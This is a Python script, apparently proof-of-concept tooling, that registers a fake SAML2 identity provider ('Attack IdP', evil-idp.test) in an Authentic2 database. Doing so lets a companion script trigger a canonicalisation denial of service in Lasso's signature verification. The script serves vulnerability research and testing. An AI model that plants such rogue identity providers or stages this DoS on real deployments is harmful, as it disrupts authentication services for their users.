#!/usr/bin/env python3
"""
Register a fake SAML2 IdP in Authentic2's database so that Lasso will
attempt signature verification (and thus run xmlC14NDocDumpMemory) on
SAMLResponses claiming to come from it.

Without this step, Lasso returns LASSO_SERVER_ERROR_PROVIDER_NOT_FOUND
before touching the signature, so the c14n DoS never fires.

Usage:
    python register_attack_idp.py [options]

Run from the authentic2 project root with the venv active:
    . venv/bin/activate
    AUTHENTIC2_SETTINGS_FILE=local_settings.py python register_attack_idp.py \\
        --cert ~/github/xml/docker-simplesamlphp/idp/server.crt \\
        --entity-id https://evil-idp.test/ \\
        --slug attack-idp

The script:
  1. Reads the signing certificate from --cert (PEM format).
  2. Builds a minimal SAML2 IdP metadata XML containing that cert.
  3. Creates (or replaces) a SAMLAuthenticator row in the database.

After running, Authentic2's mellon SP will load the IdP's public key and
call lasso_provider_verify_signature() on any SAMLResponse carrying
<saml:Issuer>https://evil-idp.test/</saml:Issuer>.
"""

import argparse
import base64
import os
import sys

# ── Django setup ──────────────────────────────────────────────────────────────
# Allow running directly without a separate manage.py invocation.
# The AUTHENTIC2_SETTINGS_FILE env var must point to your local_settings.py.

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))

import django
from django.conf import settings as _dj_settings

settings_file = os.environ.get(
    "AUTHENTIC2_SETTINGS_FILE",
    os.path.join(os.path.dirname(__file__), "local_settings.py"),
)
os.environ.setdefault("AUTHENTIC2_SETTINGS_FILE", settings_file)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "authentic2.settings")

django.setup()

# ── helpers ───────────────────────────────────────────────────────────────────

def cert_to_der_b64(pem_path: str) -> str:
    """Return the DER-encoded certificate as a single-line base64 string."""
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization import Encoding
    with open(pem_path, "rb") as f:
        cert = x509.load_pem_x509_certificate(f.read())
    return base64.b64encode(cert.public_bytes(Encoding.DER)).decode()


def build_metadata(entity_id: str, cert_b64: str, sso_url: str) -> str:
    return f"""\
<?xml version="1.0" encoding="UTF-8"?>
<md:EntityDescriptor
    xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    entityID="{entity_id}">
  <md:IDPSSODescriptor
      WantAuthnRequestsSigned="false"
      protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <md:KeyDescriptor use="signing">
      <ds:KeyInfo>
        <ds:X509Data>
          <ds:X509Certificate>{cert_b64}</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </md:KeyDescriptor>
    <md:SingleSignOnService
        Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
        Location="{sso_url}"/>
  </md:IDPSSODescriptor>
</md:EntityDescriptor>"""


def register(entity_id: str, cert_b64: str, sso_url: str, slug: str, name: str) -> None:
    from authentic2_auth_saml.models import SAMLAuthenticator

    metadata = build_metadata(entity_id, cert_b64, sso_url)

    deleted, _ = SAMLAuthenticator.objects.filter(slug=slug).delete()
    if deleted:
        print(f"[*] Removed existing SAMLAuthenticator with slug={slug!r}")

    a = SAMLAuthenticator(
        name=name,
        slug=slug,
        enabled=True,
        metadata=metadata,
    )
    a.full_clean()
    a.save()

    resolved_entity = a.settings.get("ENTITY_ID") or entity_id
    print(f"[+] Registered SAMLAuthenticator pk={a.pk}")
    print(f"    slug        : {a.slug}")
    print(f"    entity_id   : {resolved_entity}")
    print(f"    Use --idp-entity {resolved_entity} when running poc_authentic_c14n.py")


# ── main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(
        description="Register a fake SAML2 IdP in Authentic2 for DoS testing"
    )
    ap.add_argument(
        "--cert",
        required=True,
        help="PEM certificate of the attack IdP signing key "
             "(e.g. ~/github/xml/docker-simplesamlphp/idp/server.crt)",
    )
    ap.add_argument(
        "--entity-id",
        default="https://evil-idp.test/",
        dest="entity_id",
        help="entityID to use in the metadata (default: https://evil-idp.test/)",
    )
    ap.add_argument(
        "--sso-url",
        default=None,
        dest="sso_url",
        help="SingleSignOnService Location in the metadata "
             "(default: <entity-id>sso — only cosmetic, not validated)",
    )
    ap.add_argument(
        "--slug",
        default="attack-idp",
        help="Django slug for the SAMLAuthenticator row (default: attack-idp)",
    )
    ap.add_argument(
        "--name",
        default="Attack IdP",
        help="Human-readable name (default: Attack IdP)",
    )
    ap.add_argument(
        "--remove",
        action="store_true",
        help="Remove the registered IdP instead of adding it",
    )
    a = ap.parse_args()

    if a.remove:
        from authentic2_auth_saml.models import SAMLAuthenticator
        deleted, _ = SAMLAuthenticator.objects.filter(slug=a.slug).delete()
        print(f"[+] Removed {deleted} SAMLAuthenticator(s) with slug={a.slug!r}")
        return

    cert_b64 = cert_to_der_b64(a.cert)
    sso_url = a.sso_url or a.entity_id.rstrip("/") + "/sso"
    register(a.entity_id, cert_b64, sso_url, a.slug, a.name)


if __name__ == "__main__":
    main()
